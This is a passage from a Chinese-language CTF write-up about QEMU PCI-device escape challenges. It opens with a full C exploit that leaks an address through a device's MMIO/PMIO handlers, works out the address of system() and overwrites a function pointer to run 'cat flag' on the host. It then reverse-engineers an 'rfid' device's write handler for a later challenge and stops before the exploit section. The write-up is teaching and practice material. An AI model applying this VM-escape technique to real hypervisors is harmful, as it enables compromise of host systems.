
```c
#include <stdint.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/io.h>
#include <stdio.h>
#include <unistd.h>

unsigned char *mmio_mem;
void setup_mmio() {
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:03.0/resource0", O_RDWR | O_SYNC);
    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
}
void mmio_write(uint32_t addr, uint32_t val) {
    *((uint32_t *)(addr + mmio_mem)) = val;
}
uint64_t mmio_read(uint64_t addr) {
    return *((uint64_t *)(addr + mmio_mem));
}
uint32_t pmio_base = 0xc040;
void setup_pmio() {
    iopl(3); // 0x3ff 以上端口全部开启访问
}
uint64_t pmio_read(uint64_t addr) {
    return (uint64_t)inl(pmio_base + addr);
}
uint64_t pmio_write(uint64_t addr, uint64_t val) {
    outl(val, addr + pmio_base);
}
// 因为key=0，所以直接省略掉key进行写加密解密函数。注意exp内的en实际对应的是de
uint64_t en(uint32_t high, uint32_t low) {
    uint32_t sum = 0xC6EF3720;
    uint32_t delta = 0x9E3779b9;
    for (int i = 0; i < 32; i++) {
        high -= (low * 16) ^ (low + sum) ^ (low >> 5);
        low -= (high * 16) ^ (high + sum) ^ (high >> 5);
        // sum -= delta;
        sum += 0x61C88647;
    }
    return (uint64_t)high * 0x100000000 + low;
}
uint64_t de(uint32_t high, uint32_t low) {
    uint32_t sum = 0;
    uint32_t delta = 0x9E3779b9;
    for (int i = 0; i < 32; i++) {
        // sum += delta;
        sum -= 0x61C88647;
        low += (high * 16) ^ (high + sum) ^ (high >> 5);
        high += (low * 16) ^ (low + sum) ^ (low >> 5);
    }
    return (uint64_t)high * 0x100000000 + low;
}
int main()
{
    printf("begin!!!!!\n");
    setup_mmio();
    setup_pmio();
    pmio_write(8, 0x100); // opaque->seek=0x100
    pmio_write(4, 0); // key[0-3]=0
    // 0x103
    uint64_t rand_r = mmio_read(24); // decode
    printf("region rand_r:0x%lx\n", rand_r);
    uint64_t randr = de(rand_r / 0x100000000, rand_r % 0x100000000);
    printf("encode randr:0x%lx\n", randr);
    uint64_t system = randr + 0xa560;
    printf("system:0x%lx\n", system);
    uint64_t encode_system = en(system / 0x100000000, system % 0x100000000);
    printf("encode system:0x%lx\n", encode_system);
    uint32_t low_sys = encode_system % 0x100000000;
    uint32_t high_sys = encode_system / 0x100000000;
    mmio_write(24, low_sys); // 只能4字节4字节的写入
    sleep(1);
    mmio_write(24, high_sys);
    pmio_write(8, 0);
    mmio_write(0, 0x67616c66); // blocks: flag
    pmio_write(0x1c, 0x20746163); // r_seed: cat
    return 0;
}
```

## 3.2019数字经济众测qemu

### 1.题目分析

首先查看`launch.sh`脚本

```bash
#!/bin/zsh
./qemu-system-x86_64 \
-initrd ./initramfs.cpio \
-kernel ./vmlinuz-4.8.0-52-generic \
-append 'console=ttyS0 root=/dev/ram oops=panic panic=1' \
-monitor /dev/null \
-m 64M --nographic \
-L pc-bios \
-device rfid,id=vda \
```

设备是rfid，去ida内函数栏搜索rfid，并没有找到，是去掉符号表

这题没有符号表，所以不能在函数栏内搜索，换一个思路去搜索字符串rfid来寻找相应函数

![](https://bbs.kanxue.com/upload/attach/202211/922338_7KWDMVJU23TKRBX.jpg)

下面的便是`rfid_class_init`

![](https://bbs.kanxue.com/upload/attach/202211/922338_5TZ5NEGEAS8YJPJ.jpg)

想要找到`mmio`或者`pmio`对应的`write`/`read`函数，需要定位到`xxxxxxx_realize`函数，例如`d3dev`这题，定位到了`pci_d3dev_realize`函数，发现`&d3dev_mmio_ops`和`&d3dev_pmio_ops`，跟进去发现有实现方法。而`pci_d3dev_realize`在`d3dev_class_init`内引用

![](https://bbs.kanxue.com/upload/attach/202211/922338_6NVKZSCSR8V6MAB.jpg)

![](https://bbs.kanxue.com/upload/attach/202211/922338_S3885VEKQEMC5M6.jpg)

![](https://bbs.kanxue.com/upload/attach/202211/922338_MPCC9G2UEB2Z7MB.jpg)

由以上分析可得，`sub_5713A8`函数内的`sub_571043`为realize函数

![](https://bbs.kanxue.com/upload/attach/202211/922338_6V9D2YCKZ49N8CP.jpg)

点进去`off_FE9720`，发现了`mmio`的实现。

![](https://bbs.kanxue.com/upload/attach/202211/922338_CDFYPNDE327U688.jpg)

### 2.逆向

#### 1. `sub_570C63`

比对字符串，然后执行命令，漏洞肯定在另一个函数内了，看到这里应该就有了具体思路，劫持`byte_122FFE0`为"wwssadadBABA"，复写`command`变量即可

![](https://bbs.kanxue.com/upload/attach/202211/922338_WRDYX9B5DGJ2ZRM.jpg)

#### 2. `sub_570CEB`

`write`函数相当于一个菜单，以`((addr >> 20) & 0xF)`作为菜单选项，将字符传递于`byte_122FFE0`，当`result`为`6`时，将`val`赋值给`command`。由于存在移位等问题，exp的`mmio_write`/`mmio_read`函数的实现需要变化一下.

```c
_BYTE *__fastcall sub_570CEB(__int64 opaque, unsigned __int64 addr, __int64 val, unsigned int size)
{
  _BYTE *result; // rax
  _DWORD n[3]; // [rsp+4h] [rbp-3Ch] BYREF
  unsigned __int64 v6; // [rsp+10h] [rbp-30h]
  __int64 v7; // [rsp+18h] [rbp-28h]
  int v8; // [rsp+2Ch] [rbp-14h]
  int idx; // [rsp+30h] [rbp-10h]
  int v10; // [rsp+34h] [rbp-Ch]
  __int64 v11; // [rsp+38h] [rbp-8h]

  v7 = opaque;
  v6 = addr;
  *&n[1] = val;
  v11 = opaque;
  v8 = (addr >> 20) & 0xF;
  idx = (addr >> 16) & 0xF;
  result = ((addr >> 20) & 0xF);
  switch ( result )
  {
    case 0uLL:
      result = byte_122FFE0;
      byte_122FFE0[idx] = 'w';
      break;
    case 1uLL:
      result = byte_122FFE0;
      byte_122FFE0[idx] = 's';
      break;
    case 2uLL:
      result = byte_122FFE0;
      byte_122FFE0[idx] = 'a';
      break;
    case 3uLL:
      result = byte_122FFE0;
      byte_122FFE0[idx] = 'd';
      break;
    case 4uLL:
      result = byte_122FFE0;
      byte_122FFE0[idx] = 'A';
      break;
    case 5uLL:
      result = byte_122FFE0;
      byte_122FFE0[idx] = 'B';
      break;
    case 6uLL:
      v10 = v6;
      result = memcpy(&command[v6], &n[1], size);
      break;
    default:
      return result;
  }
  return result;
}
```

### 3.调试

本题没有符号表，为调试增加了比较大的困难，但是由于题目比较简单，不调试也可以做出来，为了进行学习，我来尝试一下调试。应该就和普通的pwn题一样调试，用`b *$rebase(addr)`下断点

测试环境ubuntu20可以，ubnutu18不行

![](https://bbs.kanxue.com/upload/attach/202211/922338_4T4XKVZY6TUM5C3.jpg)

下好了断点，`c`执行，然后运行exp，便可以愉快的观察程序运行

![](https://bbs.kanxue.com/upload/attach/202211/922338_3MTXMHDFV9SX7KZ.jpg)

![](https://bbs.kanxue.com/upload/attach/202211/922338_MZTWSCNPN58H6E4.jpg)

### 4.利用
